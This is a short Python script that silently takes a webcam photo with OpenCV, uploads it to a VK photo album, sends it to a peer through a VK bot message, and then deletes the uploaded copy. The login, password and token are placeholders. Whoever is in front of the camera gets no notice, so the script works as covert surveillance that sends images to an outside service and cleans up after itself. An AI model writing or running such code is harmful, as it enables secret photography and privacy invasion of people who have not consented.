import requests
import vk_api.vk_api
import json
import cv2
import random
import os
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
from datetime import datetime,timedelta



def auth_handler():

    key = input("Enter authentication code: ")
    remember_device = True

    return key, remember_device

cap = cv2.VideoCapture(0,cv2.CAP_DSHOW)
for i in range(30):
    cap.read()
ret, frame = cap.read()
cv2.imwrite('cam.png', frame)
cap.release()
cv2.destroyAllWindows()
    
vk_session = vk_api.VkApi(login='login',password='pass',auth_handler=auth_handler)

try:
    vk_session.auth()
except vk_api.AuthError as error_msg:
    print(error_msg)

upload = vk_api.VkUpload(vk_session)
photo = upload.photo(
    'cam.png',
    album_id=265350600
)

vk_photo_url = 'photo{}_{}'.format(photo[0]['owner_id'], photo[0]['id'])
vk_session_bot = vk_api.VkApi(token='token')
vk_bot = vk_session_bot.get_api()
print(vk_bot.messages.send(peer_id='is',random_id = random.randint(1,999999999),message='s',attachment=vk_photo_url))

vk = vk_session.get_api()
vk.photos.delete(owner_id=photo[0]['owner_id'],photo_id=photo[0]['id'])












